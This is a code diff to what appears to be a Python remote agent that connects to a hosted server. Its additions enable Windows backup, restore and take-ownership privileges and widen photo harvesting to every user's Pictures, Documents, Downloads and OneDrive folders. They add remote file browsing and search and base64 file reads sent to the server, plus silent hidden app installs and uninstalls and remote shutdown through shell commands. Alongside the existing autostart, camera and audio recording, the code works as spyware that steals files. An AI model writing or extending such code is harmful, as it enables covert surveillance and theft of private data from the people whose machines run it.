@@ -16,6 +16,9 @@ import cloudinary.uploader
 import wave
 from datetime import datetime
 import sys
+from pathlib import PurePath
+import ctypes
+from ctypes import wintypes
 
 try:
     import sounddevice as sd
@@ -64,6 +67,89 @@ def log_error(message):
             file.write(f"{datetime.now()}: {message}\n")
     except Exception:
         return
+
+
+def is_admin_process():
+    if os.name != "nt":
+        return False
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+
+def enable_windows_privilege(privilege_name="SeBackupPrivilege"):
+    if os.name != "nt":
+        return False
+    try:
+        advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
+        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+
+        TOKEN_ADJUST_PRIVILEGES = 0x0020
+        TOKEN_QUERY = 0x0008
+        SE_PRIVILEGE_ENABLED = 0x00000002
+
+        class LUID(ctypes.Structure):
+            _fields_ = [
+                ("LowPart", wintypes.DWORD),
+                ("HighPart", wintypes.LONG),
+            ]
+
+        class LUID_AND_ATTRIBUTES(ctypes.Structure):
+            _fields_ = [
+                ("Luid", LUID),
+                ("Attributes", wintypes.DWORD),
+            ]
+
+        class TOKEN_PRIVILEGES(ctypes.Structure):
+            _fields_ = [
+                ("PrivilegeCount", wintypes.DWORD),
+                ("Privileges", LUID_AND_ATTRIBUTES * 1),
+            ]
+
+        h_token = wintypes.HANDLE()
+        h_process = kernel32.GetCurrentProcess()
+        if not advapi32.OpenProcessToken(h_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(h_token)):
+            return False
+
+        try:
+            luid = LUID()
+            if not advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
+                return False
+
+            tp = TOKEN_PRIVILEGES()
+            tp.PrivilegeCount = 1
+            tp.Privileges[0].Luid = luid
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+            result = advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), 0, None, None)
+            err = ctypes.get_last_error()
+            if not result or err != 0:
+                return False
+            return True
+        finally:
+            kernel32.CloseHandle(h_token)
+    except Exception as err:
+        log_error(f"Failed to enable privilege {privilege_name}: {err}")
+        return False
+
+
+def init_windows_security_privileges():
+    if os.name == "nt":
+        privileges_to_enable = (
+            "SeBackupPrivilege",
+            "SeRestorePrivilege",
+            "SeSecurityPrivilege",
+            "SeTakeOwnershipPrivilege",
+        )
+        enabled_list = []
+        for priv in privileges_to_enable:
+            if enable_windows_privilege(priv):
+                enabled_list.append(priv)
+        if enabled_list:
+            log_error(f"Windows security privileges enabled: {', '.join(enabled_list)}")
+        else:
+            log_error(f"Running in standard user mode (isAdmin={is_admin_process()})")
 
 
 def load_local_env():
@@ -239,6 +325,7 @@ def terminate_stale_agent_instances():
 
 load_local_env()
 ensure_autostart_enabled()
+init_windows_security_privileges()
 
 # --- CONFIGURATION ---
 DEFAULT_SERVER_URL = "https://remote-agent-node.onrender.com"
@@ -249,14 +336,15 @@ IMAGE_SYNC_STATE_FILE = os.path.join(IMAGE_SYNC_DIR, "image_sync_state.json")
 FPS = 8.0
 RECONNECT_DELAY_SECONDS = 5
 IMAGE_SYNC_RETRY_DELAY_SECONDS = 5
-IMAGE_EXTENSIONS = {".jpg", ".jpeg"}
+IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".webp", ".heic"}
+DIRECTORY_LISTING_MAX_ENTRIES = 500
 try:
     IMAGE_SYNC_BATCH_UPLOAD_LIMIT = max(1, int(os.getenv("IMAGE_SYNC_BATCH_UPLOAD_LIMIT", "10")))
 except ValueError:
     IMAGE_SYNC_BATCH_UPLOAD_LIMIT = 10
 IMAGE_SCAN_IGNORE_DRIVES = {
     drive.strip().upper().replace(":", "")
-    for drive in os.getenv("IMAGE_SCAN_IGNORE_DRIVES", "C").split(",")
+    for drive in os.getenv("IMAGE_SCAN_IGNORE_DRIVES", "").split(",")
     if drive and drive.strip()
 }
 IMAGE_SCAN_IGNORED_DIR_NAMES = {
@@ -273,7 +361,22 @@ IMAGE_SCAN_IGNORED_DIR_KEYWORDS = {
     "software",
     "windows",
     "program files",
+    "appdata",
+    "temp",
+    "cache",
 }
+IMAGE_SCAN_EXTRA_DIRS = {
+    os.path.normpath(os.path.expandvars(os.path.expanduser(path.strip())))
+    for path in os.getenv("IMAGE_SCAN_EXTRA_DIRS", "").split(";")
+    if path and path.strip()
+}
+USER_MEDIA_SUBDIRS = [
+    "Downloads",
+    "Documents",
+    "Pictures",
+    "Videos",
+    "Desktop",
+]
 try:
     AUDIO_SAMPLE_RATE = max(8000, int(os.getenv("AUDIO_SAMPLE_RATE", "16000")))
 except ValueError:
@@ -377,6 +480,7 @@ def emit_agent_state(source=""):
             'recording': bool(is_recording),
             'cameraOn': bool(is_camera_on),
             'voiceRecording': bool(is_voice_recording),
+            'isAdmin': bool(is_admin_process()),
             'machine': MACHINE_NAME,
             'source': source,
             'timestamp': int(time.time() * 1000)
@@ -513,30 +617,644 @@ def should_ignore_path_segment(segment):
     return False
 
 
-def collect_device_image_files():
-    image_files = []
-    for drive_root in get_windows_drive_roots():
-        try:
-            for root, dirs, files in os.walk(drive_root, topdown=True):
-                dirs[:] = [directory for directory in dirs if not should_ignore_path_segment(directory)]
+def _normalize_existing_directory(path):
+    if not path:
+        return ""
+    expanded = os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
+    if os.name == "nt" and len(expanded) == 2 and expanded[1] == ":":
+        expanded += "\\"
+    if os.path.isdir(expanded):
+        return expanded
+    return ""
 
-                root_parts = re.split(r"[\\/]+", root)
-                if any(should_ignore_path_segment(part) for part in root_parts):
+
+def get_directory_shortcuts():
+    shortcuts = []
+    seen_paths = set()
+    user_candidates = [
+        os.environ.get("USERPROFILE"),
+        os.path.expanduser("~"),
+    ]
+
+    for base_path in user_candidates:
+        normalized_base = _normalize_existing_directory(base_path)
+        if not normalized_base:
+            continue
+        base_label = os.path.basename(normalized_base.rstrip("\\/")) or normalized_base
+        for subdir in USER_MEDIA_SUBDIRS:
+            candidate = _normalize_existing_directory(os.path.join(normalized_base, subdir))
+            if not candidate or candidate in seen_paths:
+                continue
+            seen_paths.add(candidate)
+            label = f"{subdir} ({base_label})" if base_label else subdir
+            shortcuts.append({
+                'path': candidate,
+                'name': label,
+                'type': 'shortcut',
+                'hasChildren': True,
+                'size': 0,
+                'extension': '',
+                'modifiedTime': 0,
+                'isLocked': False,
+                'readable': True,
+            })
+
+    for extra_dir in IMAGE_SCAN_EXTRA_DIRS:
+        candidate = _normalize_existing_directory(extra_dir)
+        if not candidate or candidate in seen_paths:
+            continue
+        seen_paths.add(candidate)
+        label = os.path.basename(candidate.rstrip("\\/")) or candidate
+        shortcuts.append({
+            'path': candidate,
+            'name': label,
+            'type': 'shortcut',
+            'hasChildren': True,
+            'size': 0,
+            'extension': '',
+            'modifiedTime': 0,
+            'isLocked': False,
+            'readable': True,
+        })
+
+    shortcuts.sort(key=lambda item: item['name'].lower())
+    return shortcuts
+
+
+def get_root_directory_entries():
+    entries = []
+    seen = set()
+    drive_entries = []
+    for drive_root in get_windows_drive_roots():
+        normalized = _normalize_existing_directory(drive_root) or drive_root
+        if normalized in seen:
+            continue
+        seen.add(normalized)
+        drive_label = drive_root.rstrip("\\/") or drive_root
+        if os.name == "nt" and drive_label:
+            display_name = f"Local Disk ({drive_label})"
+        else:
+            display_name = drive_root or "/"
+        drive_entries.append({
+            'path': normalized,
+            'name': display_name,
+            'type': 'drive',
+            'hasChildren': True,
+            'size': 0,
+            'extension': '',
+            'modifiedTime': 0,
+            'isLocked': False,
+            'readable': True,
+        })
+
+    if not drive_entries and os.name != "nt":
+        drive_entries.append({
+            'path': '/',
+            'name': '/',
+            'type': 'drive',
+            'hasChildren': True,
+            'size': 0,
+            'extension': '',
+            'modifiedTime': 0,
+            'isLocked': False,
+            'readable': True,
+        })
+
+    drive_entries.sort(key=lambda item: item['name'].lower())
+    entries.extend(drive_entries)
+
+    for shortcut in get_directory_shortcuts():
+        if shortcut['path'] in seen:
+            continue
+        entries.append(shortcut)
+        seen.add(shortcut['path'])
+
+    return entries
+
+
+def build_directory_breadcrumb(path):
+    cleaned = str(path or '').strip()
+    if not cleaned:
+        return []
+    try:
+        pure_path = PurePath(cleaned)
+    except Exception:
+        return [{'name': cleaned, 'path': cleaned}]
+
+    breadcrumb = []
+    cumulative = None
+    for part in pure_path.parts:
+        if cumulative is None:
+            cumulative = PurePath(part)
+        else:
+            cumulative = cumulative / part
+        breadcrumb.append({
+            'name': part or cleaned,
+            'path': str(cumulative),
+        })
+    return breadcrumb
+
+
+def get_file_metadata(entry_or_path):
+    try:
+        if isinstance(entry_or_path, os.DirEntry):
+            path = entry_or_path.path
+            name = entry_or_path.name
+            try:
+                is_directory = entry_or_path.is_dir(follow_symlinks=False)
+            except OSError:
+                is_directory = False
+            try:
+                stat_res = entry_or_path.stat(follow_symlinks=False)
+                size = stat_res.st_size if not is_directory else 0
+                mtime = int(stat_res.st_mtime * 1000)
+                is_locked = False
+            except OSError:
+                size = 0
+                mtime = 0
+                is_locked = True
+        else:
+            path = str(entry_or_path)
+            name = os.path.basename(path) or path
+            is_directory = os.path.isdir(path)
+            try:
+                stat_res = os.stat(path)
+                size = stat_res.st_size if not is_directory else 0
+                mtime = int(stat_res.st_mtime * 1000)
+                is_locked = False
+            except OSError:
+                size = 0
+                mtime = 0
+                is_locked = True
+
+        ext = os.path.splitext(name)[1].lower() if not is_directory else ""
+        return {
+            'path': path,
+            'name': name,
+            'type': 'directory' if is_directory else 'file',
+            'hasChildren': is_directory,
+            'size': size,
+            'extension': ext,
+            'modifiedTime': mtime,
+            'isLocked': is_locked,
+            'readable': not is_locked,
+        }
+    except Exception as err:
+        return {
+            'path': str(entry_or_path),
+            'name': os.path.basename(str(entry_or_path)),
+            'type': 'unknown',
+            'hasChildren': False,
+            'size': 0,
+            'extension': '',
+            'modifiedTime': 0,
+            'isLocked': True,
+            'readable': False,
+            'error': str(err),
+        }
+
+
+def list_directory_children(parent_path, include_files=True, max_entries=DIRECTORY_LISTING_MAX_ENTRIES):
+    normalized_parent = str(parent_path or '').strip()
+    if not normalized_parent:
+        return {
+            'normalizedParentPath': '',
+            'entries': get_root_directory_entries(),
+            'breadcrumb': [],
+            'truncated': False,
+            'accessDenied': False,
+        }
+
+    expanded = os.path.normpath(os.path.expandvars(os.path.expanduser(normalized_parent)))
+    if os.name == "nt" and len(expanded) == 2 and expanded[1] == ":":
+        expanded += "\\"
+
+    if not os.path.exists(expanded):
+        raise FileNotFoundError(f"Directory not found: {normalized_parent}")
+
+    entries = []
+    truncated = False
+    access_denied = False
+    error_message = ""
+
+    try:
+        with os.scandir(expanded) as iterator:
+            for entry in iterator:
+                try:
+                    is_dir = entry.is_dir(follow_symlinks=False)
+                except OSError:
+                    is_dir = False
+
+                if not is_dir and not include_files:
                     continue
+
+                meta = get_file_metadata(entry)
+                entries.append(meta)
+
+                if len(entries) >= max_entries:
+                    truncated = True
+                    break
+    except PermissionError as perm_err:
+        access_denied = True
+        error_message = f"Access Denied (Permission Required): {perm_err}"
+        log_error(f"Permission error scanning {expanded}: {perm_err}")
+    except Exception as error:
+        error_message = str(error)
+        log_error(f"Error scanning directory {expanded}: {error}")
+        raise RuntimeError(str(error)) from error
+
+    entries.sort(key=lambda item: (0 if item.get('type') in ('directory', 'drive', 'shortcut') else 1, str(item.get('name', '')).lower()))
+    return {
+        'normalizedParentPath': expanded,
+        'entries': entries,
+        'breadcrumb': build_directory_breadcrumb(expanded),
+        'truncated': truncated,
+        'accessDenied': access_denied,
+        'error': error_message if access_denied else "",
+    }
+
+
+def read_file_chunk_data(file_path, offset=0, length=1024 * 1024):
+    if not file_path:
+        raise ValueError("Missing file path")
+    expanded = os.path.normpath(os.path.expandvars(os.path.expanduser(file_path)))
+    if not os.path.exists(expanded):
+        raise FileNotFoundError(f"File not found: {file_path}")
+    if os.path.isdir(expanded):
+        raise IsADirectoryError(f"Path is a directory: {file_path}")
+
+    file_size = os.path.getsize(expanded)
+    offset = max(0, int(offset or 0))
+    length = max(1, min(int(length or (1024 * 1024)), 10 * 1024 * 1024))
+
+    if offset >= file_size:
+        return {
+            'filePath': expanded,
+            'offset': offset,
+            'length': 0,
+            'totalSize': file_size,
+            'dataBase64': '',
+            'eof': True,
+        }
+
+    with open(expanded, "rb") as file:
+        file.seek(offset)
+        chunk = file.read(length)
+
+    eof = (offset + len(chunk)) >= file_size
+    return {
+        'filePath': expanded,
+        'offset': offset,
+        'length': len(chunk),
+        'totalSize': file_size,
+        'dataBase64': base64.b64encode(chunk).decode('ascii'),
+        'eof': eof,
+    }
+
+
+def search_device_files(query, search_root=None, max_results=200, include_files=True, include_dirs=True):
+    query = str(query or "").strip().lower()
+    if not query:
+        return []
+
+    roots = []
+    if search_root:
+        norm = _normalize_existing_directory(search_root)
+        if norm:
+            roots.append(norm)
+    if not roots:
+        roots = get_windows_drive_roots()
+
+    results = []
+    for root in roots:
+        try:
+            for current_root, dirs, files in os.walk(root, topdown=True):
+                if include_dirs:
+                    for d in list(dirs):
+                        if query in d.lower():
+                            full_path = os.path.join(current_root, d)
+                            results.append(get_file_metadata(full_path))
+                            if len(results) >= max_results:
+                                return results
+
+                if include_files:
+                    for f in files:
+                        if query in f.lower():
+                            full_path = os.path.join(current_root, f)
+                            results.append(get_file_metadata(full_path))
+                            if len(results) >= max_results:
+                                return results
+        except Exception as err:
+            log_error(f"Search error on {root}: {err}")
+            continue
+
+    return results
+
+
+def get_known_media_directories():
+    candidate_directories = set()
+
+    def add_directory_if_exists(path):
+        normalized = _normalize_existing_directory(path)
+        if normalized:
+            candidate_directories.add(normalized)
+
+    def add_standard_media_directories(base_path):
+        normalized_base = _normalize_existing_directory(base_path)
+        if not normalized_base:
+            return
+        for subdir in USER_MEDIA_SUBDIRS:
+            add_directory_if_exists(os.path.join(normalized_base, subdir))
+
+    user_profile = os.environ.get("USERPROFILE")
+    home_dir = os.path.expanduser("~")
+    system_drive = os.environ.get("SYSTEMDRIVE", "C:")
+    system_users_dir = os.path.join(system_drive + os.sep, "Users")
+
+    user_dir_candidates = []
+    seen_dirs = set()
+
+    for candidate in filter(None, [user_profile, home_dir, system_users_dir]):
+        normalized = _normalize_existing_directory(candidate)
+        if normalized and normalized not in seen_dirs:
+            seen_dirs.add(normalized)
+            user_dir_candidates.append(normalized)
+
+    if os.path.isdir(system_users_dir):
+        try:
+            for entry in os.scandir(system_users_dir):
+                if entry.is_dir():
+                    normalized = _normalize_existing_directory(entry.path)
+                    if normalized and normalized not in seen_dirs:
+                        seen_dirs.add(normalized)
+                        user_dir_candidates.append(normalized)
+        except OSError:
+            pass
+
+    for user_dir in user_dir_candidates:
+        base_name = os.path.basename(user_dir.rstrip("\\/")).lower()
+        if base_name != "users":
+            add_standard_media_directories(user_dir)
+
+            try:
+                for entry in os.scandir(user_dir):
+                    if entry.is_dir():
+                        name_lower = entry.name.lower()
+                        if "onedrive" in name_lower:
+                            add_directory_if_exists(entry.path)
+                            add_standard_media_directories(entry.path)
+            except OSError:
+                pass
+
+    public_dir = os.path.join(system_users_dir, "Public")
+    add_standard_media_directories(public_dir)
+
+    for env_key in ("OneDrive", "OneDriveConsumer", "OneDriveCommercial"):
+        add_standard_media_directories(os.environ.get(env_key))
+        add_directory_if_exists(os.environ.get(env_key))
+
+    for extra_dir in IMAGE_SCAN_EXTRA_DIRS:
+        add_directory_if_exists(extra_dir)
+
+    return sorted(candidate_directories)
+
+
+def collect_device_image_files(scan_root=None, apply_ignore_filters=True):
+    image_files = []
+    if scan_root:
+        if isinstance(scan_root, (list, tuple, set)):
+            requested_roots = list(scan_root)
+        else:
+            requested_roots = [scan_root]
+        scan_roots = []
+        for raw_root in requested_roots:
+            normalized = _normalize_existing_directory(raw_root)
+            if normalized:
+                scan_roots.append(normalized)
+        if not scan_roots:
+            return image_files
+        strict_ignore = False
+    else:
+        preferred_roots = get_known_media_directories()
+        if preferred_roots:
+            scan_roots = preferred_roots
+        else:
+            scan_roots = get_windows_drive_roots()
+        strict_ignore = apply_ignore_filters
+
+    seen_roots = set()
+    for drive_root in scan_roots:
+        normalized_root = _normalize_existing_directory(drive_root)
+        if not normalized_root or normalized_root in seen_roots:
+            continue
+        seen_roots.add(normalized_root)
+
+        try:
+            for root, dirs, files in os.walk(normalized_root, topdown=True):
+                if strict_ignore:
+                    dirs[:] = [directory for directory in dirs if not should_ignore_path_segment(directory)]
+                    root_parts = re.split(r"[\\/]+", root)
+                    if any(should_ignore_path_segment(part) for part in root_parts):
+                        continue
 
                 for file_name in files:
                     extension = os.path.splitext(file_name)[1].lower()
                     if extension in IMAGE_EXTENSIONS:
                         full_path = os.path.join(root, file_name)
-                        path_parts = re.split(r"[\\/]+", full_path)
-                        if any(should_ignore_path_segment(part) for part in path_parts):
-                            continue
+                        if strict_ignore:
+                            path_parts = re.split(r"[\\/]+", full_path)
+                            if any(should_ignore_path_segment(part) for part in path_parts):
+                                continue
                         image_files.append(full_path)
         except Exception as error:
             log_error(f"Image scan error on {drive_root}: {error}")
 
     image_files.sort(key=lambda path: path.lower())
     return image_files
+
+
+def get_installed_applications():
+    if os.name != "nt" or winreg is None:
+        return []
+
+    reg_locations = [
+        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", winreg.KEY_WOW64_64KEY),
+        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", winreg.KEY_WOW64_32KEY),
+        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0),
+    ]
+
+    apps = {}
+    for root_key, subkey_path, flags in reg_locations:
+        try:
+            access = winreg.KEY_READ | flags if flags else winreg.KEY_READ
+            with winreg.OpenKey(root_key, subkey_path, 0, access) as key:
+                num_subkeys = winreg.QueryInfoKey(key)[0]
+                for i in range(num_subkeys):
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                        with winreg.OpenKey(key, subkey_name, 0, access) as app_key:
+                            def get_val(name):
+                                try:
+                                    v, _ = winreg.QueryValueEx(app_key, name)
+                                    return str(v).strip() if v is not None else ""
+                                except OSError:
+                                    return ""
+
+                            display_name = get_val("DisplayName")
+                            if not display_name:
+                                continue
+
+                            system_component = get_val("SystemComponent")
+                            if system_component == "1":
+                                continue
+
+                            version = get_val("DisplayVersion")
+                            publisher = get_val("Publisher")
+                            uninstall_str = get_val("UninstallString")
+                            quiet_uninstall = get_val("QuietUninstallString")
+                            install_loc = get_val("InstallLocation")
+                            install_date = get_val("InstallDate")
+
+                            app_key_id = f"{display_name}_{version}".lower()
+                            if app_key_id in apps:
+                                continue
+
+                            apps[app_key_id] = {
+                                "id": subkey_name,
+                                "name": display_name,
+                                "version": version,
+                                "publisher": publisher,
+                                "uninstallString": uninstall_str,
+                                "quietUninstallString": quiet_uninstall,
+                                "installLocation": install_loc,
+                                "installDate": install_date,
+                            }
+                    except OSError:
+                        continue
+        except OSError:
+            continue
+
+    result = list(apps.values())
+    result.sort(key=lambda x: x["name"].lower())
+    return result
+
+
+def execute_app_uninstall(app_name="", uninstall_string="", quiet_uninstall_string="", package_id=""):
+    cmd = ""
+    if package_id:
+        cmd = f'winget uninstall --id "{package_id}" --silent --accept-source-agreements'
+    elif quiet_uninstall_string:
+        cmd = quiet_uninstall_string
+    elif uninstall_string:
+        if "msiexec" in uninstall_string.lower():
+            if "/i" in uninstall_string.lower():
+                cmd = re.sub(r"/i", "/x", uninstall_string, flags=re.IGNORECASE) + " /qn /norestart"
+            elif "/x" not in uninstall_string.lower():
+                cmd = f"{uninstall_string} /qn /norestart"
+            else:
+                cmd = f"{uninstall_string} /qn /norestart"
+        else:
+            cmd = f'{uninstall_string} /S /VERYSILENT /NORESTART'
+
+    if not cmd:
+        raise ValueError("No valid uninstall command or package ID provided")
+
+    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    log_error(f"Executing uninstall command: {cmd}")
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=flags, timeout=300)
+    return {
+        "appName": app_name,
+        "success": proc.returncode in (0, 3010),
+        "returnCode": proc.returncode,
+        "stdout": proc.stdout.strip(),
+        "stderr": proc.stderr.strip(),
+    }
+
+
+def execute_app_install(package_id="", installer_path="", custom_args=""):
+    if package_id:
+        cmd = f'winget install --id "{package_id}" --silent --accept-package-agreements --accept-source-agreements'
+    elif installer_path:
+        ext = os.path.splitext(installer_path)[1].lower()
+        if ext == ".msi":
+            args = custom_args or "/qn /norestart"
+            cmd = f'msiexec /i "{installer_path}" {args}'
+        else:
+            args = custom_args or "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART /S"
+            cmd = f'"{installer_path}" {args}'
+    else:
+        raise ValueError("Must provide either package_id or installer_path")
+
+    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    log_error(f"Executing install command: {cmd}")
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=flags, timeout=600)
+    return {
+        "packageId": package_id,
+        "installerPath": installer_path,
+        "success": proc.returncode in (0, 3010),
+        "returnCode": proc.returncode,
+        "stdout": proc.stdout.strip(),
+        "stderr": proc.stderr.strip(),
+    }
+
+
+def search_winget_packages(query):
+    query = str(query or "").strip()
+    if not query:
+        return []
+    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    proc = subprocess.run(
+        f'winget search "{query}" --accept-source-agreements',
+        shell=True,
+        capture_output=True,
+        text=True,
+        creationflags=flags,
+        timeout=30,
+    )
+    lines = proc.stdout.strip().splitlines()
+    packages = []
+    for line in lines:
+        if "---" in line or not line.strip():
+            continue
+        parts = re.split(r"\s{2,}", line.strip())
+        if len(parts) >= 2:
+            name = parts[0]
+            pkg_id = parts[1]
+            version = parts[2] if len(parts) > 2 else ""
+            source = parts[3] if len(parts) > 3 else ""
+            if pkg_id.lower() != "id" and name.lower() != "name":
+                packages.append({
+                    "name": name,
+                    "id": pkg_id,
+                    "version": version,
+                    "source": source,
+                })
+    return packages[:50]
+
+
+def execute_system_power(action="restart", timeout_seconds=5, message="Action initiated via Remote Control"):
+    action = str(action or "restart").strip().lower()
+    timeout = max(0, int(timeout_seconds or 5))
+
+    if action in ("restart", "reboot", "reset"):
+        cmd = f'shutdown /r /t {timeout} /c "{message}"'
+    elif action in ("shutdown", "poweroff"):
+        cmd = f'shutdown /s /t {timeout} /c "{message}"'
+    elif action in ("abort", "cancel"):
+        cmd = 'shutdown /a'
+    else:
+        raise ValueError(f"Unsupported power action: {action}")
+
+    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    log_error(f"Executing system power action '{action}': {cmd}")
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=flags)
+    return {
+        "action": action,
+        "success": proc.returncode == 0,
+        "returnCode": proc.returncode,
+        "stdout": proc.stdout.strip(),
+        "stderr": proc.stderr.strip(),
+    }
 
 
 def compute_file_sha256(file_path):
@@ -588,7 +1306,7 @@ def emit_image_sync_snapshot(event_name='image_sync_snapshot'):
         log_error(f"Failed to emit image sync snapshot ({event_name}): {error}")
 
 
-def image_sync_worker(force_rescan=False, trigger_source="admin"):
+def image_sync_worker(force_rescan=False, trigger_source="admin", scan_root=None):
     global is_image_sync_running
     global image_sync_thread
     global image_sync_reset_requested
@@ -600,9 +1318,9 @@ def image_sync_worker(force_rescan=False, trigger_source="admin"):
         next_index = state.get('nextIndex', 0)
         uploaded_hashes = set(state.get('uploadedHashes', []))
 
-        if force_rescan or not pending_files or next_index >= len(pending_files):
-            emit_image_sync_state('scanning', {'trigger': trigger_source})
-            pending_files = collect_device_image_files()
+        if force_rescan or not pending_files or next_index >= len(pending_files) or scan_root:
+            emit_image_sync_state('scanning', {'trigger': trigger_source, 'scanPath': scan_root or ''})
+            pending_files = collect_device_image_files(scan_root=scan_root)
             next_index = 0
             save_image_sync_state(pending_files, next_index, uploaded_hashes)
 
@@ -740,7 +1458,7 @@ def image_sync_worker(force_rescan=False, trigger_source="admin"):
             image_sync_thread = None
 
 
-def start_image_sync(force_rescan=False, trigger_source="admin"):
+def start_image_sync(force_rescan=False, trigger_source="admin", scan_root=None):
     global is_image_sync_running
     global image_sync_thread
     global image_sync_reset_requested
@@ -764,7 +1482,7 @@ def start_image_sync(force_rescan=False, trigger_source="admin"):
         is_image_sync_running = True
         image_sync_thread = threading.Thread(
             target=image_sync_worker,
-            args=(bool(force_rescan), trigger_source),
+            args=(bool(force_rescan), trigger_source, scan_root),
             daemon=True,
         )
         image_sync_thread.start()
@@ -1360,13 +2078,15 @@ def on_force_update_check(data=None):
 
 def handle_find_image_and_save(data=None, event_name="find_image_and_save"):
     force_rescan = False
+    scan_path = ''
     if isinstance(data, dict):
         force_rescan = bool(data.get('forceRescan', False))
+        scan_path = str(data.get('scanPath') or data.get('directory') or '').strip()
 
-    log_error(f"{event_name} received (forceRescan={force_rescan})")
-    started = start_image_sync(force_rescan=force_rescan, trigger_source=event_name)
+    log_error(f"{event_name} received (forceRescan={force_rescan} scanPath={scan_path})")
+    started = start_image_sync(force_rescan=force_rescan, trigger_source=event_name, scan_root=scan_path)
     if started:
-        emit_image_sync_state('queued', {'trigger': event_name, 'forceRescan': force_rescan})
+        emit_image_sync_state('queued', {'trigger': event_name, 'forceRescan': force_rescan, 'scanPath': scan_path})
 
 
 @sio.on('find_image_and_save')
@@ -1413,6 +2133,337 @@ def on_stop_and_reset_image_sync(data=None):
 def on_get_image_sync_status(data=None):
     log_error("get_image_sync_status received")
     emit_image_sync_snapshot()
+
+
+@sio.on('list_directories')
+def on_list_directories(data=None):
+    request_id = ''
+    parent_path = ''
+    include_files = True
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        parent_path = data.get('parentPath') or ''
+        if 'includeFiles' in data:
+            include_files = bool(data.get('includeFiles'))
+
+    try:
+        listing = list_directory_children(parent_path, include_files=include_files)
+        payload = {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'parentPath': parent_path or '',
+            'normalizedParentPath': listing.get('normalizedParentPath', ''),
+            'entries': listing.get('entries', []),
+            'breadcrumb': listing.get('breadcrumb', []),
+            'truncated': bool(listing.get('truncated', False)),
+            'accessDenied': bool(listing.get('accessDenied', False)),
+            'error': listing.get('error', ''),
+            'isAdmin': bool(is_admin_process()),
+            'timestamp': int(time.time() * 1000),
+        }
+        sio.emit('directory_listing', payload)
+    except Exception as error:
+        sio.emit('directory_listing', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'parentPath': parent_path or '',
+            'error': str(error),
+            'timestamp': int(time.time() * 1000),
+        })
+
+
+@sio.on('list_files_and_directories')
+def on_list_files_and_directories(data=None):
+    on_list_directories(data=data)
+
+
+@sio.on('browse_filesystem')
+def on_browse_filesystem(data=None):
+    on_list_directories(data=data)
+
+
+@sio.on('get_file_info')
+def on_get_file_info(data=None):
+    request_id = ''
+    file_path = ''
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        file_path = str(data.get('filePath') or '').strip()
+
+    try:
+        meta = get_file_metadata(file_path)
+        sio.emit('file_info_result', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'metadata': meta,
+            'timestamp': int(time.time() * 1000),
+        })
+    except Exception as error:
+        sio.emit('file_info_result', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'filePath': file_path,
+            'error': str(error),
+            'timestamp': int(time.time() * 1000),
+        })
+
+
+@sio.on('read_file_chunk')
+def on_read_file_chunk(data=None):
+    request_id = ''
+    file_path = ''
+    offset = 0
+    length = 1024 * 1024
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        file_path = str(data.get('filePath') or '').strip()
+        offset = int(data.get('offset') or 0)
+        length = int(data.get('length') or (1024 * 1024))
+
+    try:
+        chunk_data = read_file_chunk_data(file_path, offset=offset, length=length)
+        chunk_data.update({
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'timestamp': int(time.time() * 1000),
+        })
+        sio.emit('file_chunk_data', chunk_data)
+    except Exception as error:
+        sio.emit('file_chunk_data', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'filePath': file_path,
+            'offset': offset,
+            'error': str(error),
+            'timestamp': int(time.time() * 1000),
+        })
+
+
+@sio.on('search_files')
+def on_search_files(data=None):
+    request_id = ''
+    query = ''
+    search_root = None
+    max_results = 200
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        query = str(data.get('query') or '').strip()
+        search_root = data.get('searchRoot') or data.get('rootPath')
+        max_results = int(data.get('maxResults') or 200)
+
+    try:
+        results = search_device_files(query, search_root=search_root, max_results=max_results)
+        sio.emit('search_files_result', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'query': query,
+            'searchRoot': search_root or '',
+            'results': results,
+            'count': len(results),
+            'timestamp': int(time.time() * 1000),
+        })
+    except Exception as error:
+        sio.emit('search_files_result', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'query': query,
+            'error': str(error),
+            'timestamp': int(time.time() * 1000),
+        })
+
+
+@sio.on('list_installed_apps')
+def on_list_installed_apps(data=None):
+    request_id = ''
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+
+    try:
+        apps = get_installed_applications()
+        sio.emit('installed_apps_list', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'apps': apps,
+            'count': len(apps),
+            'timestamp': int(time.time() * 1000),
+        })
+    except Exception as error:
+        sio.emit('installed_apps_list', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'apps': [],
+            'error': str(error),
